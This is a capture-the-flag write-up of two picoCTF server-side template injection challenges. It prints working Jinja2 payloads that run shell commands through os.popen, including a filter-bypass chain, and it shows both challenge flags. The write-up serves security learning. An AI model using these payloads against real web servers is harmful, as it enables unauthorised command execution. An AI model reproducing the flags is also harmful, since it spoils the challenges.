# SSTI 1 — PicoCTF

### Description

> I made a cool website where you can announce whatever you want! Try it out!

Once the instance boots, we’re dropped into a basic web app with a search bar.


<img width="839" height="416" alt="Screenshot 2025-11-19 215557" src="https://github.com/user-attachments/assets/cc1d58df-b304-40f3-a524-10e6599db8c0" />



Nothing interesting in the page source — but the challenge title gives it away: this is a Server-Side Template Injection (SSTI) box.

---

### Initial Payload

I tested a basic Jinja2 payload from my cheatsheet:

```
{7*7}
```


<img width="794" height="237" alt="Screenshot 2025-11-19 145719" src="https://github.com/user-attachments/assets/fbd4f1c7-d3cb-45fc-82be-98f8409de703" />



It returned:

```
49
```

<img width="834" height="379" alt="Screenshot 2025-11-19 145724" src="https://github.com/user-attachments/assets/314bd1fd-60f3-4690-975c-adba3d75df44" />



Confirmed — we’ve got SSTI.

---

### File Enumeration

Next step: find a payload that can list files. After a few tries, this one worked:

```
{{ cycler.__init__.__globals__.os.popen('ls').read() }}
```

Output:

<img width="1534" height="261" alt="Screenshot 2025-11-19 151152" src="https://github.com/user-attachments/assets/59dd0d92-f653-4169-a335-df1cd81638c5" />


```
__pycache__ app.py  flag  requirements.txt
```

Perfect. Now let’s read the flag by changing our command :

```
{{ cycler.__init__.__globals__.os.popen('cat flag').read() }}
```

And there it is:


<img width="1919" height="290" alt="Screenshot 2025-11-19 151029" src="https://github.com/user-attachments/assets/fd5095e8-24c3-4575-8092-30a247bfc9f5" />


**Flag:** `picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_dcdca99a}`

---
---

# SSTI 2 — PicoCTF

### Description

> I made a cool website where you can announce whatever you want! I read about input sanitization, so now I remove any kind of characters that could be a problem :)

Same setup as SSTI 1, but this time the server filters out dangerous characters. Most payloads get blocked with:

```
Stop trying to break me >:(
```


<img width="1912" height="426" alt="Screenshot 2025-11-19 151356" src="https://github.com/user-attachments/assets/43d9cc82-c1a0-436c-ba0a-cfe37e216a79" />


---

### Bypassing Filters

I tried several encoded payloads. Eventually, I found a working one from [this OnSecurity article](https://onsecurity.io/article/server-side-template-injection-with-jinja2/):

```jinja2
{{request|attr('application')|attr('__globals__')|attr('__getitem__')('__builtins__')|attr('__getitem__')('__import__')('os')|attr('popen')('ls')|attr('read')()}}
```
It executed successfully and listed:

```
__pycache__  app.py  flag  requirements.txt
```


<img width="1343" height="228" alt="Screenshot 2025-11-19 153309" src="https://github.com/user-attachments/assets/0c29b7b0-932b-4da8-b560-a41335fd45dd" />


Then I swapped the command to read the flag:

```jinja2
...('cat flag')...
```

And got:


<img width="1317" height="239" alt="Screenshot 2025-11-19 153436" src="https://github.com/user-attachments/assets/7165e77c-c798-41c5-b8b6-eca10a69c28d" />


**Flag:** `picoCTF{sst1_f1lt3r_byp4ss_4de30aa0}`

---

### Challenge Complete

Both SSTI challenges solved — one with raw payloads, the other with encoded filter bypasses. Clean, satisfying wins.
